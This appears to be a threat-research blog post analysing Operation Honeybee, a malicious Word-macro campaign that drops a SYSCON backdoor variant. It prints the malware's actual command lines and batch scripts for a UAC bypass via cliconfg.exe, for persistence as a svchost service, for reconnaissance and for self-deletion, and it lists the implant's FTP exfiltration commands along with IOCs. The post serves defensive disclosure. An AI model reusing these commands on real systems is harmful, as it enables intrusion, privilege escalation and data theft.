Our\nanalysts have named this Operation Honeybee, based on the names of the malicious documents used in the attacks.\n\nAdvanced Threat Research analysts have also discovered malicious documents authored by the same actor that indicate a\ntactical shift. These documents do not contain the typical lures by this actor, instead using Word compatibility messages to\n\nentice victims into opening them.\n\nThe Advanced Threat Research team also observed a heavy concentration of the implant in Vietnam from January 15–17.\n\n\n-----\n\n### Background\n\nOn January 15, Advanced Threat Research discovered an operation using a new variant of the SYSCON backdoor.\n\n(https://www.securityweek.com/backdoor-uses-ftp-server-cc) The Korean-language Word document manual.doc appeared\n\nin Vietnam on January 17, with the original author name of Honeybee.\n\n\n-----\n\nThis malicious document contains a Visual Basic macro that dropped and executed an upgraded version of the implant\n\nknown as SYSCON, which appeared in 2017 in malicious Word documents as part of several campaigns using North\n\nKorea–related topics. The malicious Visual Basic script uses a unique key (custom alphabet) to encode data. We have seen\nthis in previous operations using SYSCON. This key was also used in the Honeybee campaign and appears to have been\n\nused since August 2017.\n\nExamples of decoy documents.\n\nSeveral additional documents surfaced between January 17 and February 3. All contain the same Visual Basic macro code\n\nand author name as Honeybee. Some of the malicious documents were test �les without the implant. From our analysis,\n\nmost these documents were submitted from South Korea, indicating that some of the targeting was in South Korea. These\n\nHoneybee documents did not contain any speci�c lures, rather variations of a “not compatible” message attempting to\n\nconvince the user to enable content.\n\nWe also observed a related malicious document created January 12 by the author Windows User that contained a di�erent\nencoding key, but essentially used the same macro and same type of implant as we saw with the recent Honeybee\n\ndocuments. This document, “International Federation of Red Cross and Red Crescent Societies – DPRK Country O�ce,”\n\ndrops an implant with the control server address 1113427185.ifastnet.org, which resolves to the same server used by the\n\nimplants dropped in the Honeybee case.\n\n\n-----\n\nThe directory contents of control server 1113427185.ifastnet.org.\n\nThe directory contents of ftp.byethost11.com, from Honeybee samples.\n\nLog �les of compromised machines from February 2018 Honeybee samples.\n\n### MaoCheng Dropper\n\n\n-----\n\ndropper. This dropper uses a stolen digital signature from Adobe Systems. This certi�cate is also used by another Korean\n\nlanguage malware compiled January 16 (hash: 35904f482d37f5ce6034d6042bae207418e450f4) with an interesting\n\nprogram database (PDB) path.\n\nD:\\Task\\DDE Attack\\MaoCheng\\Release\\Dropper.pdb\n\nThe malware is a Win32 executable that pretends to be a Word document based on its icon. This is a dropper for the same\n\ntype of malware as observed with the other Word documents. This sample also dropped a decoy document with the\n\nauthor name Honeybee. This sample, however, contained a bug that interfered with the execution �ow of the dropper,\n\nsuggesting that the authors did not test the malware after code signing it.\n\nThe decoy document uses the cloud-based accounting software company Xero as a lure:\n\n\n-----\n\n### Possible Operator\n\nThe Advanced Threat Research team has identi�ed the following persona (snoopykiller@mail.ru) tied to this recent\n\noperation. Based on our analysis, the actor registered two free hosting accounts: navermail.byethost3.com, which refers to\n\nthe popular South Korean search engine, and nihon.byethost11.com. The email address was used to register a free\n\naccount for a control server in all the implants described in our analysis.\n\n### Technical Analysis\n\nLet’s start with an overview of the attack:\n\nWe continue with the components involved in this operation.\n\n\n-----\n\nThe malicious Word �le is the beginning of the infection chain and acts as a dropper for two DLL �les. The Word �le\n\ncontains malicious Visual Basic macro code that runs when the document is opened in Word using the Document_Open()\nautoload function. The word �le also contains a Base64-encoded �le (encoded with a custom key) in it that is read,\n\ndecoded, and dropped to the disk by the macro.\n\nThe Document_Open() subroutine implementing the malicious functionality.\n\nThe Visual Basic macro performs the following tasks:\n\nOpens a handle to the malicious document to read the encoded CAB �le\nDecodes the CAB �le and writes it to the disk at %temp%\\setup.cab\n\n\n-----\n\nEncoded CAB �le in the Word document.\n\nDecoding and writing the CAB �le to %temp%.\n\n\n-----\n\nThe decoded CAB �le in the Visual Basic memory bu�er.\n\nThe CAB �le contains the following �les and functions:\n\ndll: A malicious DLL used to launch batch �les (used with cliconfg.exe for UAC bypass). The DLL contains the following\nPDB path: D:\\Task\\MiMul\\NTWDBLIB\\Release\\NTWDBLIB.pdb.\nbat: A batch �le to set up the service COMSysApp, for an x64 system\n\nbat: A batch �le to set up the service COMSysApp, for an x86 system\nini: A data �le with Base64-encoded data for connecting to an FTP server. Credentials are encoded in the .ini �le.\n\nDecoded credential data contained in ipnet.ini.\n\ndll: The malicious DLL �le run as a service (using svchost.exe). The DLL contains the following PDB path:\nD:\\Task\\MiMul\\FTPCom_vs10\\Release\\Engine.pdb.\nThe macro then extracts the CAB �le into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on\n\nthe OS) to again bypass UAC prompts\nOnce the �les have been extracted, the Visual Basic macro deletes the CAB �le and runs the malicious NTWDBLIB.dll via\n\ncliconfg.exe (to gain privileges and bypass UAC protections)\nCommand lines used by the Visual Basic macro:\n\ncmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe\ncmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe\n\nA combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows.\nUAC bypass via DLL hijacking requires:\n\nA Windows executable with the auto-elevate property in its manifest\n\nA Windows executable in a secure directory (%systemroot%\\system32)\n\nThe malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of\n\nthe two batch �les contained in the CAB �le (which is also dropped to %systemroot%\\system32):\n\nNTWDBLIB executing the installer batch �les under the context of cliconfg.exe.\n\n\n-----\n\nthe batch �les vary depending on the OS (x64 vs x86):\n\n#### install1.bat (x64)\n\n@echo o�\n\nsc stop COMSysApp\nsc con�g COMSysApp type= own start= auto error= normal binpath= \"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\"\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysA\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\n\nsc start COMSysApp\ndel /f /q %windir%\\SysWOW64\\install2.bat\ndel /f /q %windir%\\SysWOW64\\install1.bat\n\n#### install2.bat (x86)\n\n@echo o�\nsc stop COMSysApp\n\nsc con�g COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\"\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysA\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\n\nsc start COMSysApp\ndel /f /q %windir%\\System32\\install1.bat\n\ndel /f /q %windir%\\System32\\install2.bat\n\nThe batch �les perform these tasks:\n\nStop the service COMSysApp\nCon�gure the service to autostart (to set up persistence on the system)\nModify registry keys to launch the DLL unser svchost.exe\n\nSpecify the malicious DLL path to be loaded into the svchost process.\nImmediately restart the service\n\nRemove the batch �les to reduce the �ngerprint on the system\n\nIPNet.dll runs as a service under svchost.exe.\n\nThe malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll\n\nusing:\n\ncmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\nAll the following capabilities described are implemented by the malicious service DLL implant unless speci�ed.\n\n#### Variant using North Korean Red Cross\n\nAnother variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same\n\nBase64-decoding scheme with a di�erent custom key. This document was created January 10.\n\n\n-----\n\nContents of the decoy document.\n\nThis variant also consists of two CAB �les that are dropped to %temp%, depending on the OS (x86 or x64).\n\nThe key di�erences in this variant:\n\nTwo CAB �les are encoded into the Word document in text boxes instead of being appended in the DOC �le\nThere is one CAB �le for an x86 system and another for an x64 system\nThis malware sample uses uacme.exe with dummy.dll to implement the UAC bypass\n\nexe is the program vulnerable to the UAC bypass attack\ndll runs install.bat to set up the service (same as NTWDBLIB.dll)\n\nexe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS. Ipnet.dll may also be either 64-bit or 32-bit.\nThe Visual Basic macro uses the following command line:\n\ncmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe\n\nThe control server credential information contained in the CAB �les is di�erent:\n\nDecoded credential data contained in another ipnet.ini.\n\nSimilarities between this variant and the original malware sample:\n\nService name is the same: COMSysApp\nThe DLL and ini �les contain the same functions as described elsewhere in this post\n\n### Data Reconnaissance\n\nThe following information is gathered from the endpoint and sent to the control server.\n\nSystem info:\n\nComputer name\nSystem info using: cmd /c systeminfo >%temp%\\temp.ini\nList of currently running process using: cmd /c tasklist >%temp%\\temp.ini\n\n### Ex�ltration\n\n\n-----\n\nthe pattern:\n\nFrom <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For example, From <COMPUTER-NAME> (0104 11-40-02).txt\n\nAll the text �les are now packed into the archive temp.zip (%temp%\\temp.zip)\nzip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt\n\ntxt is uploaded to the control server\n\n### Additional Commands and Capabilities\n\nThe service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any �les with the\n\nkeywords:\n\nTO EVERYONE: Commands issued to all infected endpoints\nTO <COMPUTERNAME>: Commands issued to endpoints matching the ComputerName\n\nThe following commands are supported by the malware implant:\n\ncmd /c pull <�lename>: Adds �lename to temp.zip, Base64 encodes, and uploads to control server\ncmd /c chip <string>: Deletes current ipnet.ini con�g �le. Writes new con�g info (control server connection info) to new\n\nipnet.ini.\ncmd /c put <new_�le_name> <existing_�le_name>: Copies existing �le to new �le name. Deletes existing �le.\n/user <parameters>: Executes downloaded �le with parameters speci�ed using CreateProcessAsUser\ncmd /c <command>: Executes command on infected endpoint\n\n### Conclusion\n\nThe actor behind Honeybee has been operating with new implants since at least November 2017 with the �rst known\nversion of NTWDBLIB installer. Furthermore, based on the various metadata in both documents and executables, the actor\n\nis likely a Korean speaker.\n\nThe techniques used in the malicious documents such as the lure messages closely resemble what we have observed\nbefore in South Korea. The attacker appears to target those involved in humanitarian aid and inter-Korean a�airs. We\nhave seen this operation expand beyond the borders of South Korea to target Vietnam, Singapore, Argentina, Japan,\n\nIndonesia, and Canada.\n\nBased on the McAfee Advanced Threat Research team’s analysis, we �nd multiple components from this operation are\nunique from a code perspective, even though the code is loosely based on previous versions of the SYSCON backdoor.\nSome new droppers have not been observed before in the wild. The MaoCheng dropper was apparently created\n\nspeci�cally for this operation and appeared only twice in the wild.\n\n### Indicators of compromise\n\n#### MITRE ATT&CK techniques\n\nModify existing service\nCode signing\n\nFile deletion\nDeobfuscate/decode �les or information\nSystem information discovery\nProcess discovery\nService execution\n\n\n-----\n\nCommand line Interface\nData from local system\nAutomated ex�ltration\nData encrypted\n\nCommonly used port\nBypass user account control\n\n#### Hashes\n\nfe32d29fa16b1b71cd27b23a78ee9f6b7791b�3\n\nf684e15dd2e84bac49ea9b89f9b2646dc32a2477\n1d280a77595a2d2bbd36b9b5d958f99be20f8e06\n19d9573f0b2c2100accd562cc82d57adb12a57ec\nf90a2155ac492c3c2d5e1d83e384e1a734e59cc0\n\n9b832dda912cce6b23da8abf3881fcf4d2b7ce09\nf3b62fea38cb44e15984d941445d24e6b309bc7b\n66d2cea01b46c3353f4339a986a97b24ed89ee18\n7113aaab61cacb6086c5531a453adf82ca7e7d03\nd41daba0ebfa55d0c769ccfc03dbf6a5221e006a\n\n25f4819e7948086d46df8de2eeeaa2b9ec6eca8c\n35ab747c15c20da29a14e8b46c07c0448cef4999\ne87de3747d7c12c1eea9e73d3c2fb085b5ae8b42\n0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0\nbca861a46d60831a3101c50f80a6d626fa99bf16\n\n01530adb3f947fabebae5d9c04fb69f9000c3cef\n4229896d61a5ad57ed5c247228606ce62c7032d0\n4c7e975f95ebc47423923b855a7530af52977f57\n5a6ad7a1c566204a92dd269312d1156d51e61dc4\n\n1dc50bfcab2bc80587ac900c03e23afcbe243f64\n003e21b02be3248�72cc2bfcd05bb161b6a2356\n9b7c3c48bcef6330e3086de592b3223eb198744a\n85e2453b37602429596c9681a8c58a5c6faf8d0c\n\n### Domains\n\nftp.byethost31.com\nftp.byethost11.com\n1113427185.ifastnet.org\n\nnavermail.byethost3.com\nnihon.byethost3.com\n\n Previous Article (https://securingtomorrow.mcafee.com/consumer/mobile-security/key-mobile-threat-takeaways2018-mobile-threats-report/)\n\nNext Article  (https://securingtomorrow.mcafee.com/mcafee-labs/hackers-bypassed-adobe-�ash-protectionmechanism/)\n\n[ Categories: McAfee Labs (https://securingtomorrow.mcafee.com/category/mcafee-labs/)](https://securingtomorrow.mcafee.com/category/mcafee-labs/)\n\n[ Tags:  advanced persistent threats (https://securingtomorrow.mcafee.com/tag/advanced-persistent-threats/),](https://securingtomorrow.mcafee.com/tag/advanced-persistent-threats/)\n[cybersecurity (https://securingtomorrow.mcafee.com/tag/cybersecurity/), malware](https://securingtomorrow.mcafee.com/tag/cybersecurity/)\n[(https://securingtomorrow.mcafee.com/tag/malware/), Phishing (https://securingtomorrow.mcafee.com/tag/phishing/)](https://securingtomorrow.mcafee.com/tag/phishing/)\n\n\n-----\n\nFacebook Comments (0) Comments (0) G+ Comments\n\n## Newsletter Sign Up\n\nFirst Name *\n\nLast Name *\n\nEmail Address *\n\nCountry *\n\n--Please Select-\n## McAfee on Twitter\n\n[ Follow us on Twitter (https://twitter.com/McAfee)](https://twitter.com/McAfee)\n\n\nSubmit\n\n\n[mcafee_labs (https://www.twitter.com/mcafee_labs)](https://www.twitter.com/mcafee_labs)\n\n[Lazarus is using a never-before-seen tactic to get ahold of #Bitcoin (https://twitter.com/#search?q=Bitcoin)](https://twitter.com/#search?q=Bitcoin)\n\n[wallets.
